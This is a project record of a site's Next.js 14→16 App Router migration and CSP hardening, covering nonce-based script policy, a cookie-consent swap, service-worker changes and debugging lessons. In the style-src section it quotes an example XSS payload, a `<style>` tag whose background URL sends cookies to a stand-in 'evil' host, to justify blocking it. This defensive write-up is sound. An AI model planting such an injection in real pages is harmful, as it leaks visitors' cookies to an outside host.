# CSP and Next.js Roadmap

> Historical record of the CSP hardening + Next.js modernization project. All originally deferred items have shipped. Lessons learned during implementation are captured at the bottom so future agents don't re-discover them.

---

## Current state (as of 2026-05-26, after `app-router-next16` branch merge)

**Framework**: Next.js 16.2.6 (App Router), React 19.2.6, Tailwind 3.4.19, OpenAI SDK 5.23.2, vanilla-cookieconsent 3.1.0, TypeScript 5.9.3. Bun 1.3.8 pinned in CI.

**Rendering**: every route renders dynamically per request via `export const dynamic = 'force-dynamic'` in `app/layout.tsx`. This is the cost of nonce-based CSP — there is no static prerendering on this site except `/sitemap.xml`. TTFB is +20–100ms vs the prior fully-static build; Render's instance billing model means cost impact is negligible at our traffic.

**CSP** (set in `proxy.ts`, per-request nonce via `btoa(crypto.randomUUID())`):
- `script-src 'self' 'nonce-<…>' 'strict-dynamic' https://www.googletagmanager.com https://www.google-analytics.com` — `'unsafe-eval'` is in dev only (React Refresh needs it)
- `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com` (fallback for ancient browsers)
- `style-src-elem 'self' https://fonts.googleapis.com` — modern browsers: strict, no `<style>` tag injection
- `style-src-attr 'unsafe-inline'` — modern browsers: allow React `style={{}}` props (~149 in the codebase)
- `upgrade-insecure-requests` only when the request itself was HTTPS (Render terminates TLS upstream and sets `x-forwarded-proto: https`); skipped locally so dev over HTTP doesn't break
- Strict non-script directives: `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`
- Set `CSP_REPORT_ONLY=true` in env to ship the policy in report-only mode (safety-net for first deploys of CSP changes)

**Auto-noncing**: Next 16 auto-attaches the request's nonce to every framework script tag in the served HTML (including inline RSC payload scripts). Our own JSON-LD `<script>` tags in `app/<route>/page.tsx` files explicitly thread the nonce via `headers()` from `next/headers`.

**Inline scripts/styles of our authorship**: zero `<style>` tags. JSON-LD blocks are inline `<script>` tags with nonce. Cookie consent runs from `components/CookieConsentLoader.tsx` via dynamic `import('vanilla-cookieconsent')` from a `'use client'` component — bundled into Next's nonced client chunks, no inline anything.

**Service worker** (`public/sw.js`): page HTML is **network-only**, never cached. Per-request nonces make HTML caching impossible — cached HTML would ship a stale nonce that wouldn't match the current response's CSP, blocking every framework script. `CACHE_VERSION` was bumped `v2.0.0 → v3.0.0` at the migration cutover to invalidate any v2 caches in returning users' browsers.

**Automation**: Dependabot watches `bun` + `github-actions` weekly (Mondays 9am PT). Majors are NOT ignored anymore for `next`/`react`/`react-dom` (they were before this migration, can be re-pinned if desired).

---

## What shipped on `app-router-next16` branch (2026-05-26)

A single bundled PR that closed all 6 originally-deferred items plus structural framework upgrade:

### 1. Pages Router → App Router (the foundation)

Every page moved from `pages/<route>.tsx` to `app/<route>/page.tsx` + `<Route>Client.tsx` using the **server-wrapper pattern**:
- `page.tsx` is a server component, `async`, reads `nonce` via `await headers()`, exports `metadata` + `viewport`, renders Header + JSON-LD `<script nonce={nonce}>` + `<RouteClient />` + Footer
- `<Route>Client.tsx` has `'use client'` directive and contains the original page's JSX/hooks (Head removed, JSON-LD removed — moved up to the server wrapper)

Why split: Metadata API only exports from server components. Pages with `'use client'` directive can't export `metadata`. Server wrapper handles metadata + nonce reading; client child handles interactive behavior. Clean separation.

### 2. Next 14 → 16, React 18 → 19

Dep bumps in one shot:
- `middleware.ts` renamed to `proxy.ts` per Next 16 convention (function name `middleware` → `proxy`)
- `headers()`, `cookies()`, `params`, `searchParams` became async — every call site `await`s now
- Turbopack default for both `next dev` and `next build` — no custom webpack config so no impact
- `next lint` removed — we never used it (Biome runs directly)
- `images.minimumCacheTTL` default changed 60s → 14400s; kept our explicit 60 override
- `JSX` namespace removed from React 19 globals — added `import type { JSX } from 'react'` where needed (Footer, Header)
- Node ≥ 20.9 required

### 3. Nonce CSP — `'unsafe-inline'` and `'unsafe-eval'` out of `script-src`

`proxy.ts` generates a per-request nonce, injects it into request headers as `x-nonce`, and sets the CSP response header with `'nonce-<…>' 'strict-dynamic'`. Server components consume the nonce via `await headers()` from `next/headers` and thread it to their `<script>` tags. Framework scripts get auto-nonced by Next 16.

CSP moved from `next.config.js` headers (static) to `proxy.ts` (per-request). Non-CSP security headers (HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy) stayed in `next.config.js` since they're request-independent.

### 4. Osano cookie consent → vanilla-cookieconsent v3.1.0

`components/CookieConsentLoader.tsx` (new) dynamically imports vanilla-cookieconsent and its CSS from a `'use client'` `useEffect`. Theme via CSS variables (`--cc-bg`, `--cc-btn-primary-bg`, etc.) in `styles/global.css`. GA loader gated on `onConsent`/`onChange` callbacks via `acceptedCategory('analytics')`.

Why swap: Osano runtime-injects `<style>` elements via `document.createElement('style')` + `.sheet.insertRule()` — incompatible with strict `style-src-elem` regardless of nonces. vanilla-cookieconsent v3 ships a single bundled CSS file (no runtime injection) so it works under strict CSP. Roll-your-own (~150 lines) was rejected as it would have been a half-finished library.

Deleted: `public/static/cookieconsent.js`, `public/static/cookieconsent.css`, `public/static/cookieconsent-init.js`.

### 5. Style-src split

- `style-src-elem 'self' https://fonts.googleapis.com` — strict; blocks injected `<style>` tags (the real XSS vector — `<style>body{background:url(http://evil/?cookies)}</style>`)
- `style-src-attr 'unsafe-inline'` — allows React `style={{}}` props (~149 across the codebase for parallax, animation, dynamic colors)
- Parent `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com` retained as fallback for browsers that don't honor the granular directives

### 6. Service worker tightening

`public/sw.js`:
- `STATIC_CACHE_URLS` reduced from `['/', '/home', '/about', ..., '/manifest.json']` to just `['/manifest.json']`
- `handlePageRequest` rewritten stale-while-revalidate → network-only
- `CACHE_VERSION` `v2.0.0` → `v3.0.0` to bust any v2 caches in returning visitors' browsers

### 7. Custom `app/not-found.tsx`

Next's default not-found component ships its React tree (including `body{background:#fff}` styles) serialized in every page's RSC payload. During hydration the subtree briefly mounts before its boundary collapses → white flash on every page. Replacing it with our own dark-themed `app/not-found.tsx` swaps the default tree in the RSC payload.

---

## Gotchas hit during implementation (read before similar projects)

These are the bugs that took multiple debug cycles to find. All documented inline in code where relevant; collected here for visibility.

### 1. Tailwind `content` paths went stale silently
`tailwind.config.js` `content` array pointed at `./pages/**/*` which got deleted. Tailwind generated CSS with only the classes used in `components/**` — pages rendered with structural HTML but missing all colors/sizes/layouts. No error, no warning. CSS bundle dropped from ~49KB (correct) to ~38KB.

**Symptom**: pages render structurally but visually broken. **Fix**: update `content: ['./app/**/*.{js,ts,jsx,tsx}', './components/**/*.{js,ts,jsx,tsx}']`.

### 2. Static prerender + per-request nonce = blocked scripts
A statically prerendered page has nonce attributes baked into framework `<script>` tags at build time. When the proxy injects a *per-request* nonce into the CSP header, the build-time nonces don't match → every script blocked. Real-browser-only failure mode (HTTP-only smoke tests pass because they don't execute JS).

**Symptom**: `/privacy` (and any page without `headers()` reads) ships 20 unnonced framework scripts. **Fix**: `export const dynamic = 'force-dynamic'` in `app/layout.tsx` — every route renders dynamically per request.

### 3. `upgrade-insecure-requests` breaks local HTTP dev
Once we set `upgrade-insecure-requests` in CSP, Safari (strictest of the browsers) upgrades every subresource URL from `http://` to `https://`. Production behind Render's TLS terminator: fine. Local `http://localhost:4321`: every asset fails TLS handshake → blank page with TLS errors in console.

**Fix**: in `proxy.ts`, only emit `upgrade-insecure-requests` when `request.headers.get('x-forwarded-proto') === 'https' || request.nextUrl.protocol === 'https:'`.

### 4. Default `not-found` ships white body CSS to every page
See §7 above. Next's default not-found component serializes `body{background:#fff}` into the RSC payload of every route, causing brief white flashes during hydration. **Fix**: `app/not-found.tsx` override.

### 5. Negative z-index + opaque `<body>` background = hidden elements
We added `<body style={{ background: '#000' }}>` to mask transient white flashes. This broke background videos on 5 pages that used `z-[-10]` wrappers — body's solid background paints OVER negative-z-index elements in the same stacking context (positive z-index elements paint AFTER body bg in the CSS stacking algorithm).

**Symptom**: background videos rendered as black on `/projects`, `/blog`, `/news`, `/faq`, `/operations-consulting`, `/about`. **Fix**: `z-[-10]` → `z-0` across all 5 wrappers; their parent `<main>` elements already had `z-10` so layering still works.

### 6. Skip-nav `focus:not-sr-only` triggered by Next's WCAG auto-focus
Next 16 App Router auto-focuses content after client-side navigation for screen-reader users. That programmatic `.focus()` triggers the `:focus` pseudo-class on the skip-nav link, popping it visually via `focus:not-sr-only`. Switching to `focus-visible:` helped but Safari's focus-visible heuristic still occasionally treated post-navigation focus as keyboard-derived.

**Fix**: skip-nav is now permanently `sr-only` (screen readers still announce + activate it; sighted keyboard users no longer see a visible cue on Tab, which is the only accessibility regression).

### 7. Safari caches backdrop-filter compositor across soft navigations
`backdrop-filter: blur(4px)` on `.header` caused a stale-backdrop visual glitch in Safari during App Router soft navigations — until any user click triggered a repaint. Synthetic repaint via `transform: translateZ(0)` made it worse.

**Fix**: removed `backdrop-filter` entirely. Header is now a flat `rgba(0,0,0,0.7)` translucent strip (`0.85` when scrolled). Sacrifices the frosted-glass aesthetic; not worth the visual bug.

### 8. Video element first-frame decode = brief white flash
Video elements rendered nothing until their first frame decoded, and Safari's "empty video" default rendering can be light. Adding `preload="auto"`, explicit `width`/`height`, `poster="data:image/png;base64,..."` (1×1 black), and `background: '#000'` mitigated most cases. The structural fix was rendering BOTH `<Image>` (for /home) and `<video>` (for other pages) permanently and toggling visibility via Tailwind `hidden` class — so nothing re-mounts on client-side navigation.

### 9. Bun's `Buffer` vs Edge `btoa`
`proxy.ts` runs on Node (Next 16 dropped Edge support for `proxy`). Both `Buffer.from(...)` and `btoa(...)` work but `btoa` is shorter and runtime-agnostic. We use `btoa(crypto.randomUUID())` for the nonce.

### 10. Render `x-forwarded-proto` is load-bearing
Render terminates TLS and forwards as `http://` internally, setting `x-forwarded-proto: https`. Our `upgrade-insecure-requests` conditional and `request.headers.get('x-forwarded-for')` IP detection both depend on this header being honored. Confirmed working; if Render's proxy config ever changes, both will need re-validation.

---

## Open opportunistic items (not blockers)

### 1. Inline `style={{}}` props → Tailwind classes
~149 `style={{}}` props remain (parallax transforms, dynamic colors, animations). Most are necessary (Framer Motion bindings, dynamic values), a subset is static and could move to Tailwind. Net security gain: small (`style-src-attr` is a much lower-leverage XSS vector than `script-src`). **Do opportunistically when touching files, not as a dedicated project.**

### 2. `'unsafe-eval'` in dev only — verify Motion doesn't trip prod
Currently `'unsafe-eval'` is in `script-src` only when `NODE_ENV === 'development'`. Motion (formerly Framer Motion) v12 in our codebase doesn't appear to use `eval`/`new Function()` based on local testing, but real-traffic verification under enforcing CSP is the safety check. If violations appear in browser console after deploy, add `'unsafe-eval'` to the prod CSP and re-evaluate later.

### 3. `backdrop-filter` blur restoration
Removed in §7 above. Restoring requires either a WebKit fix for the stale-compositor bug or a different visual approach (e.g., always-solid header background with no blur claim). Low priority — current solid translucent header looks fine.

### 4. Service worker offline page polish
`getOfflinePage()` in `sw.js` is a synthesized HTML response with inline `<style>` and `onclick`. The SW returns it without CSP headers so the inline content works, but it's a tiny offline-only page. Could be cleaned up but not urgent.

### 5. Bundle reduction via partial-prerendering or static islands
Every route is `ƒ Dynamic` now. Some routes have stable content that could benefit from PPR or static islands once Next stabilizes those features for App Router with nonce CSP. Investigate post-Next-17.

---

## Files changed by the migration

| Type | Files |
|---|---|
| New | `app/layout.tsx`, `app/not-found.tsx`, `app/sitemap.ts`, `app/*/page.tsx` (×9), `app/*/<Route>Client.tsx` (×9), `app/api/chat/route.ts`, `app/api/substack/route.ts`, `proxy.ts`, `components/AnalyticsTracker.tsx`, `components/CookieConsentLoader.tsx` |
| Deleted | `pages/` (all 13 files), `middleware.ts`, `public/static/cookieconsent.{js,css,-init.js}`, `docs/CSP-AND-NEXTJS-ROADMAP.md` (replaced by this doc) |
| Modified | `package.json`, `bun.lock`, `tsconfig.json`, `biome.json`, `tailwind.config.js`, `next.config.js`, `styles/global.css`, `public/sw.js`, all 6 client-using components in `components/` (added `'use client'` + JSX import), `context/ChatContext.tsx` (`'use client'`) |

Total: ~35 files, +192/-5994 lines (the big deletion is the bundled Osano library + Pages Router page files).
